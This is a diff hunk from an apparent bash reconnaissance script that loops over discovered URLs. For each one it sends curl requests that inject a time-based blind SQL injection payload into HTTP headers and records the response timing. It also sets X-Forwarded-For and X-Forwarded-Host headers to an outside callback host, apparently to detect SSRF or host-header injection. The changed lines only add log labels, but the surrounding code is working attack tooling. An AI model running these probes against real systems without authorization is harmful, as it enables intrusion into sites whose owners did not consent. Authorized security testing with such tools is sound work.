@@ -175,7 +175,9 @@ subdomains(){
 			echo "\r\n*** URL: $url - Header: $head\r\n" >> 9httprobeXORsqli$1.txt
 			curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME:%{time_starttransfer}\r\n" $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
 		done
+		echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url\r\n" >> 9httprobeXORsqli$1.txt
 		curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
+		echo "\r\n*** URL: $url - Header: X-Forwarded-Host: estebancano.com.ar/abc.php?$url\r\n" >> 9httprobeXORsqli$1.txt
 		curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
 	done
 	
